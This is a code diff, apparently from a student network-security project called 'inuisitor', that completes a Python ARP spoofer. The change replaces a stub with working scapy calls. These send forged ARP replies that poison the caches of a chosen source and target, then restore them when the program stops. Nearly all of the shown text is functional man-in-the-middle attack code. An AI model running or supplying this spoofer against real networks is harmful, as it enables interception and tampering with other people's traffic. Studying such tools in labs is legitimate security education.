@@ -29,19 +29,20 @@ class Spoofer(threading.Thread):
             while not self.event.is_set():
                 print("ARP spoofing") # Spoof
                 self.event.wait(seconds_to_spoof)
-                self.ft_spoof()
-            print
+                Spoofer.SpooferRefresh.ft_spoof(self.ip_address,  self.ip_dst,  self.mac_dst)
+                Spoofer.SpooferRefresh.ft_spoof(self.ip_address, self.ip_src,  self.mac_src)
+            Spoofer.SpooferRefresh.ft_spoof(self.ip_src,  self.ip_dst,  self.mac_dst)
+            Spoofer.SpooferRefresh.ft_spoof(self.ip_dst, self.ip_src,  self.mac_src)
             exit(0)
 
 
-        def ft_spoof(self):
-            # scapy.send(scapy.ARP(op = 2, pdst = ip_dst, 
-            #                  hwdst = mac_src, 
-            #                            psrc = self.ip_address), verbose = False)
-            print(self.ip_address)
-            pass
+        def ft_spoof(ip_origin, ip_dest, mac_dest):
+            scapy.send(scapy.ARP(op = 2, pdst =ip_dest,
+                              hwdst = mac_dest, 
+                                        psrc = ip_origin), verbose = True)
 
     def __init__(self, ip_src, mac_src, ip_dst, mac_dst) -> None:
+        print("Init thread")
         super(Spoofer, self).__init__()
         self.event = threading.Event()
         self.spoofer_refresher = Spoofer.SpooferRefresh(self.event, ip_src, mac_src, ip_dst, mac_dst)
@@ -60,20 +61,19 @@ class Spoofer(threading.Thread):
             signal.pause()
 
 
-def ft_handler(signum, frame):
-    pass
-
-if __name__ == "__main__":
+def ft_parser_args():
     parser = argparse.ArgumentParser(description='ARP spoofer, ./inuisitor <IP-src> <MAC-src> <IP-target> <MAC-target>')
     parser.add_argument('addresses', action='store', nargs=4, help="<IP-src> <MAC-src> <IP-target> <MAC-target>")
 
     args = parser.parse_args()
+ 
+    return (args.addresses[0],args.addresses[1] ,args.addresses[2] ,args.addresses[3])
 
-    ip_src = args.addresses[0]
-    mac_src = args.addresses[1]
-    ip_dst = args.addresses[2]
-    mac_dst = args.addresses[3]
+if __name__ == "__main__":
+    print("Main")
+    ip_src, mac_src, ip_dst, mac_dst = ft_parser_args()
     
     spoofer = Spoofer(ip_src, mac_src, ip_dst, mac_dst)
+    print("Spoofer start")
     spoofer.start()
     spoofer.join()
